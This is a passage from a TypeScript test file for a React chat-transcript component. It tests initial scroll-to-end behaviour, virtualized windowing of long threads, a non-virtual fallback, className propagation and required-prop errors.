    expect(state.hasApplied).toBe(false)

    // Third attempt (next commit): confirmed settled.
    applyInitialScroll(state, 'end', 61, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)
    expect(state.hasApplied).toBe(true)

    // A fourth attempt must not fire again.
    applyInitialScroll(state, 'end', 62, () => 300, scrollToEnd, isAtEnd)
    expect(scrollToEnd).toHaveBeenCalledTimes(1)
  })

  test('the container-height read happens at most once per mount — verification never touches it, only isAtEnd', () => {
    const state: InitialScrollState = { hasApplied: false, attempts: 0 }
    const scrollToEnd = mock(() => {})
    const getContainerHeight = mock(() => 300)
    const isAtEnd = mock(() => true)

    applyInitialScroll(state, 'end', 60, getContainerHeight, scrollToEnd, isAtEnd)
    expect(getContainerHeight).toHaveBeenCalledTimes(1)
    expect(isAtEnd).not.toHaveBeenCalled()

    // Verification call — reads `isAtEnd`, not `getContainerHeight` (no forced `offsetHeight`
    // layout once the row count / container height have already done their one job).
    applyInitialScroll(state, 'end', 61, getContainerHeight, scrollToEnd, isAtEnd)
    expect(getContainerHeight).toHaveBeenCalledTimes(1)
    expect(isAtEnd).toHaveBeenCalledTimes(1)
    expect(state.hasApplied).toBe(true)

    // Every later commit (one per streamed chunk on a live thread) re-runs the dependency-free
    // effect — a settled transcript must touch neither thunk.
    applyInitialScroll(state, 'end', 62, getContainerHeight, scrollToEnd, isAtEnd)
    expect(getContainerHeight).toHaveBeenCalledTimes(1)
    expect(isAtEnd).toHaveBeenCalledTimes(1)
  })
})

function manyMessages(count: number): ChatMessage<TranscriptPart>[] {
  const t0 = 1_000_000_000
  return Array.from({ length: count }, (_, i) => ({
    id: `vm${i}`,
    role: i % 2 === 0 ? 'user' : 'assistant',
    // 10 minutes apart — never groups, keeping this describe block orthogonal to grouping.
    parts: [{ id: `vm${i}-p1`, type: 'text', text: `message ${i}` }],
    createdAt: t0 + i * 10 * 60_000,
  }))
}

// `virtual-core` itself unconditionally calls `scrollTo({ top: 0, behavior: undefined })` the
// moment ANY virtualizer first attaches its scroll element (`_willUpdate`'s
// `this.scrollElement !== scrollElement` branch, verified against the installed 3.17.1 source) —
// that call exists with or without this feature and is not evidence of anything. The initial-scroll
// effect's own call is `scrollToEnd({ behavior: 'auto' })`, so an explicit `behavior: 'auto'`
// argument is what's genuinely diagnostic — and, on the very FIRST mount (before any append has
// ever run `setOptions` again), it can only have come from that effect: `followOnAppend`'s own
// `behavior: 'auto'` re-scroll is gated on `prevOptions !== undefined`, i.e. it never fires on
// construction. (A later append's `followOnAppend` call is indistinguishable from the effect's own
// at this DOM boundary — the `applyInitialScroll` describe block above proves the once-ever
// guarantee with a fake `scrollToEnd` instead, precisely because of that ambiguity.)
// Typed structurally rather than as `ReturnType<typeof spyOn>`: `spyOn` is generic over the object
// and key being spied on, so referencing its return type with the type arguments unresolved leaves
// `mock.calls` uninferrable and every callback parameter an implicit `any` (a tsc error under this
// package's strict config — `bun test` alone never sees it).
function autoBehaviorCalls(spy: {
  readonly mock: { readonly calls: readonly unknown[][] }
}): number {
  return spy.mock.calls.filter(
    (call) => (call[0] as { behavior?: string } | undefined)?.behavior === 'auto',
  ).length
}

describe('virtualization (AGENT-CHAT-SPEC.md §9)', () => {
  let originalOffsetHeight: PropertyDescriptor | undefined

  beforeEach(() => {
    originalOffsetHeight = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'offsetHeight')
    // happy-dom has no layout engine — every element's offsetHeight is always 0, which makes
    // TanStack Virtual compute a zero-height viewport and render nothing at all. A fixed value
    // gives it a real, deterministic non-degenerate viewport to compute a visible window against.
    Object.defineProperty(HTMLElement.prototype, 'offsetHeight', { configurable: true, value: 300 })
  })

  afterEach(() => {
    if (originalOffsetHeight !== undefined) {
      Object.defineProperty(HTMLElement.prototype, 'offsetHeight', originalOffsetHeight)
    } else {
      delete (HTMLElement.prototype as { offsetHeight?: number }).offsetHeight
    }
  })

  test('virtualize renders a windowed subset of a large thread, once the lazy import resolves', async () => {
    const messages = manyMessages(200)
    const { container } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} virtualize height={300} />
      </MantineProvider>,
    )

    // The Suspense fallback (`VirtualizeSuspenseFallback`) is an EMPTY placeholder with no row
    // content at all, so waiting for ANY rendered row can only resolve once the lazy
    // `@tanstack/react-virtual` import has settled and the real virtualizer has mounted — unlike
    // the assertion this replaces (`await screen.findByText('message 199')`), which resolved from
    // the OLD full-row-tree fallback at SYNCHRONOUS tick 0, before any `await`, regardless of
    // whether the import ever resolved or the virtualizer ever ran.
    //
    // Which row lands first is deliberately NOT asserted: happy-dom has no layout/scroll engine
    // (every element's `scrollHeight`/`offsetHeight` beyond the stubbed constant above is 0), so
    // `anchorTo: 'end'` cannot be proven in this harness — observed locally, the virtualizer mounts
    // starting at index 0, not the tail, here. That behaviour remains unverified until the browser
    // gate; this test only proves the async mount + windowing, not the anchor direction.
    await waitFor(() => {
      const renderedCount = container.querySelectorAll('[data-testid^="agent-message-"]').length
      expect(renderedCount).toBeGreaterThan(0)
      expect(renderedCount).toBeLessThan(200)
    })
  })

  test('virtualize keeps windowing with an active live/streaming turn appended', async () => {
    const messages = manyMessages(80)
    const { container } = render(
      <MantineProvider>
        <ThreadTranscript
          messages={messages}
          virtualize
          height={300}
          liveParts={[{ id: 'live-p1', type: 'text', text: 'streaming reply' }]}
          liveStatus="streaming"
        />
      </MantineProvider>,
    )

    await waitFor(() => {
      expect(container.querySelectorAll('[data-testid^="agent-message-"]').length).toBeGreaterThan(
        0,
      )
    })

    // `anchorTo: 'end'` cannot be relied on in happy-dom (no layout/scroll engine — see the
    // previous test's comment), so the live block does not necessarily paint on its own. This
    // proves the settled/live SPLIT (the `settledRows`/`liveRow`/`rows` memos from finding #2) still
    // hands the virtualizer one COMBINED row set that genuinely includes the live block, by
    // manually scrolling the pane to its reported end and confirming the live message is what
    // renders there — not that a live message got dropped when it was pulled out of the settled
    // memo.
    const scrollElement = container.querySelector('div[style*="overflow: auto"]')
    if (scrollElement === null)
      throw new Error('expected the virtualizer scroll container to exist')
    ;(scrollElement as HTMLElement).scrollTop = Number.MAX_SAFE_INTEGER
    fireEvent.scroll(scrollElement)

    await waitFor(() => {
      expect(screen.queryByText('streaming reply')).not.toBeNull()
    })

    // 80 settled + 1 live = 81 total; still windowed even scrolled to the tail.
    const renderedCount = container.querySelectorAll('[data-testid^="agent-message-"]').length
    expect(renderedCount).toBeGreaterThan(0)
    expect(renderedCount).toBeLessThan(81)
  })

  test('the non-virtual path is unchanged — every message renders, unwindowed', () => {
    const messages = manyMessages(12)
    const { container } = render(
      <MantineProvider>
        <ThreadTranscript messages={messages} />
      </MantineProvider>,
    )

    expect(container.querySelectorAll('[data-testid^="agent-message-"]').length).toBe(12)
  })

  test('the optional-peer-absent degrade target renders every row unwindowed, and never throws', () => {
    const rows = Array.from({ length: 30 }, (_, i) => ({
      key: `fallback-row-${i}`,
      node: <div data-testid={`fallback-row-${i}`}>{`row ${i}`}</div>,
    }))

    let container: HTMLElement | undefined
    expect(() => {
      ;({ container } = render(
        <MantineProvider>
          <VirtualizeFallback
            rows={rows}
            height={300}
            overscan={6}
            estimateSize={96}
            initialScroll="end"
          />
        </MantineProvider>,
      ))
    }).not.toThrow()

    expect(container).toBeDefined()
    expect(container?.querySelectorAll('[data-testid^="fallback-row-"]').length).toBe(30)
    expect(screen.getByTestId('fallback-row-0')).toBeDefined()
    expect(screen.getByTestId('fallback-row-29')).toBeDefined()
  })

  // happy-dom has no scroll engine, so scroll POSITION can't be asserted (see the module-level
  // comment on the first test above). What CAN be asserted, genuinely, is the SCROLL INTENT: a
  // spy on `Element.prototype.scrollTo` — the exact DOM entry point `virtual-core`'s `elementScroll`
  // calls at the bottom of `scrollToEnd()` (verified against the installed 3.17.1 source; happy-dom
  // implements `scrollTo` as a real, synchronous `scrollTop` write for the `'auto'`/default
  // behavior this effect uses, so the spy observes a genuine call, not a no-op the DOM silently
  // swallows). This is the boundary the brief asks for: a fake/spy at the edge, not a pretended
  // observation of scroll position.
  describe('the default open-at-the-newest-message jump (VirtualizeOptions.initialScroll)', () => {
    test('fires once the lazy virtualizer mounts', async () => {
      const scrollToSpy = spyOn(Element.prototype, 'scrollTo')
      const messages = manyMessages(60)
      const { container } = render(
        <MantineProvider>
          <ThreadTranscript messages={messages} virtualize height={300} />
        </MantineProvider>,
      )

      await waitFor(() => {
        expect(
          container.querySelectorAll('[data-testid^="agent-message-"]').length,
        ).toBeGreaterThan(0)
      })
      expect(autoBehaviorCalls(scrollToSpy)).toBeGreaterThan(0)

      scrollToSpy.mockRestore()
    })

    test('a virtualizer that mounted behind a hidden ancestor lands the jump on the commit that makes it measurable', async () => {
      // The reachable version of `virtualize.ts`'s third+fourth composition rules meeting: the
      // lazy `import('@tanstack/react-virtual')` settles ASYNCHRONOUSLY, so a `ThreadFeedRow`
      // collapsed during that window mounts `VirtualizedRowsInner` behind `display: none` — every
      // measurement reads 0, and the commit that later un-hides the body changes neither the row
      // count nor the virtualizer identity. A dependency-keyed effect never re-runs for that
      // commit, which stranded the transcript at message #0 for the rest of the row's life.
      // happy-dom has no per-element layout to hide, so the describe block's 300px prototype stub
      // is overridden to 0 to reach the same state, then restored to stand in for the re-expand.
      Object.defineProperty(HTMLElement.prototype, 'offsetHeight', { configurable: true, value: 0 })
      const scrollToSpy = spyOn(Element.prototype, 'scrollTo')
      const messages = manyMessages(60)
      // A FRESH element on every render pass: React bails out of re-rendering a subtree whose
      // element object is reference-identical to the previous one, which would skip the very
      // commit this test is about.
      const tree = () => (
        <MantineProvider>
          <ThreadTranscript messages={messages} virtualize height={300} />
        </MantineProvider>
      )
      const { container, rerender } = render(tree())

      // A 0px viewport windows to no rows at all, so wait on the real virtualizer's sizer instead
      // (same signal the empty-transcript test below uses).
      await waitFor(() => {
        expect(container.querySelector('div[style*="overflow: auto"] > div')).not.toBeNull()
      })
      expect(autoBehaviorCalls(scrollToSpy)).toBe(0)

      Object.defineProperty(HTMLElement.prototype, 'offsetHeight', {
        configurable: true,
        value: 300,
      })
      rerender(tree())

      expect(autoBehaviorCalls(scrollToSpy)).toBeGreaterThan(0)

      scrollToSpy.mockRestore()
    })

    test('initialScroll: "start" suppresses the jump entirely', async () => {
      const scrollToSpy = spyOn(Element.prototype, 'scrollTo')
      const messages = manyMessages(200)
      const { container } = render(
        <MantineProvider>
          <ThreadTranscript
            messages={messages}
            virtualize={{ initialScroll: 'start' }}
            height={300}
          />
        </MantineProvider>,
      )

      await waitFor(() => {
        expect(
          container.querySelectorAll('[data-testid^="agent-message-"]').length,
        ).toBeGreaterThan(0)
      })
      expect(autoBehaviorCalls(scrollToSpy)).toBe(0)

      scrollToSpy.mockRestore()
    })

    test('an empty transcript never scrolls, and never throws', async () => {
      const scrollToSpy = spyOn(Element.prototype, 'scrollTo')

      let container: HTMLElement | undefined
      expect(() => {
        ;({ container } = render(
          <MantineProvider>
            <ThreadTranscript messages={[]} virtualize height={300} />
          </MantineProvider>,
        ))
      }).not.toThrow()

      // No message rows ever exist to wait on, so instead wait for the REAL virtualizer's nested
      // sizer `Box` (present only once `LazyVirtualizedRows` — not `VirtualizeSuspenseFallback`,
      // which renders a single childless pane — has mounted).
      await waitFor(() => {
        expect(container?.querySelector('div[style*="overflow: auto"] > div')).not.toBeNull()
      })
      expect(autoBehaviorCalls(scrollToSpy)).toBe(0)

      scrollToSpy.mockRestore()
    })
  })
})

describe('common props (`common/props.ts`)', () => {
  test('className reaches the non-virtualized root', () => {
    const { container } = render(
      <MantineProvider>
        <ThreadTranscript messages={buildMessages(1)} className="my-transcript" />
      </MantineProvider>,
    )
    expect(container.querySelector('.my-transcript')).not.toBeNull()
  })

  test('className reaches the virtualized (Suspense-fallback) root', () => {
    const { container } = render(
      <MantineProvider>
        <ThreadTranscript
          messages={buildMessages(1)}
          virtualize
          height={300}
          className="my-virtual-transcript"
        />
      </MantineProvider>,
    )
    expect(container.querySelector('.my-virtual-transcript')).not.toBeNull()
  })
})

describe('assertRequiredProps (F-ERR-1)', () => {
  test('a missing `messages` throws a named message, not a raw TypeError', () => {
    expect(() => {
      render(
        <MantineProvider>
          <ThreadTranscript {...({} as unknown as ThreadTranscriptProps)} />
        </MantineProvider>,
      )
    }).toThrow('[basalt] ThreadTranscript: prop "messages" is required')
  })
})
